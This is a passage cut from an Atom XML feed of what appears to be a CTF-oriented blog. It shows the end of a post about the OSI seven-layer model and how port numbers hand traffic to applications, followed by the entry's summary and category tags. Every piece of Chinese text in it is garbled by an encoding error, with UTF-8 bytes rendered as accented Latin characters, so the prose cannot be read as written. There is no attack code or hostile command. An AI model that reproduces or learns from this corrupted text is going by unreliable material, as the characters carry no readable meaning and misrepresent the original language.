‡ç«¯å£å·ç»™åˆ°æŒ‡å®šçš„åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºå¤„ç†å¥½åï¼Œå°±å¯ä»¥æŒ‰ç…§æºçš„ä¿¡æ¯ä½œå‡ºå“åº”ï¼Œå›å»çš„åŸç†ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;OSIä¸ƒå±‚æ¨¡å‹çš„è®¾è®¡çµæ„Ÿæ¥è‡ªå“ªé‡Œï¼Ÿ&quot;&gt;&lt;a href=&quot;#OSIä¸ƒå±‚æ¨¡å‹çš„è®¾è®¡çµæ„Ÿæ¥è‡ªå“ªé‡Œï¼Ÿ&quot; class=&quot;headerlink&quot; title=&quot;OSIä¸ƒå±‚æ¨¡å‹çš„è®¾è®¡çµæ„Ÿæ¥è‡ªå“ªé‡Œï¼Ÿ&quot;&gt;&lt;/a&gt;OSIä¸ƒå±‚æ¨¡å‹çš„è®¾è®¡çµæ„Ÿæ¥è‡ªå“ªé‡Œï¼Ÿ&lt;/h2&gt;&lt;p&gt;å½“å¹´åˆ¶å®šOSIæ¨¡å‹çš„</summary>
      
    
    
    
    <category term="CTFeræˆé•¿ä¹‹é“" scheme="https://pwnling.github.io/categories/CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E9%81%93/"/>
    
    
  </entry>
  
</feed>
